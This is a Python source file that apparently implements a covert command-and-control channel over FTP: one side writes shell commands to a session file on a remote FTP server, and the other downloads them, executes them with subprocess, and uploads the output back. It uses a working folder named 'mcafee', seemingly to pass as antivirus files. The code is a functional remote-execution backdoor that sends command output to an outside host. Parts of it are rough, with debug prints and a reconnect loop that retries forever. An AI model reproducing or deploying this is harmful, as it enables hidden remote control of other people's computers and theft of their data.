from ftplib import FTP
import io
import subprocess
import hashlib, binascii
import sys

delimiter = '\n-#$#-\n'

parent_dir = "mcafee"



class cmdFile:
    def __init__(self, session):
        print("\nEnter IP/HOST: ")
        self.proxy_ip = sys.stdin.readline().replace("\n", "")
        print("\nEnter Port: ")
        self.proxy_port = int(sys.stdin.readline().replace("\n", "") or "21")#input("\nEnter Port: ") or "21")
        print("\nEnter Usernae: ")
        self.proxy_user = sys.stdin.readline().replace("\n", "")#input("\nEnter User: ") or "anonymous"
        print("\nEnter Password: ")
        self.proxy_pass = sys.stdin.readline().replace("\n", "")#input("\nEnter Pass: ") or "anonymous"
    #sys.stdin.
        #for line in sys.stdin:
        #    print(line)
        #    print("asd")
        print("asd")
        print(self.proxy_ip)
        print(self.proxy_port)
        print(self.proxy_user)
        print(self.proxy_pass)
        #raise Exception("Help")
        self.session = session
        self.oo = b''
        self.ss = ''
        self.connectFtp()
        self.session_file = open(self.session + 'cm', 'w+')     # Save the command in local log file
        self.session_file.close()
        
        try:
            self.ftp.mkd(parent_dir)
        except:
            print("some error 0x1")

        try:
            self.ftp.cwd(parent_dir)
        except:
            print("Some error 0x3")
        return 
    
    def connectFtp(self):
        try:
            self.ftp = FTP()
            self.ftp.connect(self.proxy_ip, self.proxy_port)
            self.ftp.login(self.proxy_user, self.proxy_pass)
        except:
            self.connectFtp()
        return 

    def putCommand(self, cmd):
        self.session_file = open(self.session + '.cm', 'ab')     # Save the command in local log file
        #s = self.session_file.read()
        self.session_file.write(bytes(delimiter + cmd, 'ascii'))
        self.session_file.close()

        try:
            self.getCommandFile()
            if len(self.ss) > 0:
                print(self.ss)
                print("\nWait, last command did not finished")
                return
            
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.oo', bio)    # Clean last output

            print("...")
            bio = io.BytesIO(bytes(cmd, 'ascii'))
            print("...")
            print(bio)
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
            print("\nCommand Delivered!")
        except Exception as e:
            print("some error 0x2")
            print(e)

        return 

    def executeCommand(self):
        self.getCommandFile()
        if len(self.ss) == 0:
            raise Exception("No Command")
        #need to clear the file now
        try:
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)

            oop = subprocess.getoutput(self.ss)
            print(oop)
            self.ss = ''
            #self.getOutputFile()
            self.oo += bytes(delimiter + oop, 'ascii')
            print(oop)

        except: 
            self.oo += delimiter + oop

        try:
            bio = io.BytesIO(self.oo)   # Save this output into a complete outputs file
            self.ftp.storbinary('STOR ' + self.session + '.op', bio)

            bio = io.BytesIO(bytes(oop, 'ascii'))   # Save this output into a file
            self.ftp.storbinary('STOR ' + self.session + '.oo', bio)

        except:
            print("some error 0x5")

        return 

    def getCommandFile(self):
        self.ss = ''
        try:
            self.tmpfile = open('tmp'+self.session+'.cm', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.cm', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.cm', 'rb')
            self.ss = self.tmpfile.read()
            self.tmpfile.close()
        except:
            print("Error 0x4")
            #bio = io.BytesIO(b'uname -a')
            #self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
        return self.ss

    def getLastOutput(self):
        self.oo = b''
        try:
            self.tmpfile = open('tmp'+self.session+'.oo', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.oo', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.oo', 'rb')
            self.oo = self.tmpfile.read()
            self.tmpfile.close()
        except:
            #bio = io.BytesIO(b'')
            #self.ftp.storbinary('STOR ' + self.session + '.oo', bio)
            pass
        return self.oo

    def getOutputFile(self):
        self.oo = b''
        try:
            self.tmpfile = open('tmp'+self.session+'.op', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.op', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.op', 'rb')
            self.oo = self.tmpfile.read()
            self.tmpfile.close()
        except:
            #bio = io.BytesIO(b'')
            #self.ftp.storbinary('STOR ' + self.session + '.op', bio)
            pass
        return self.oo
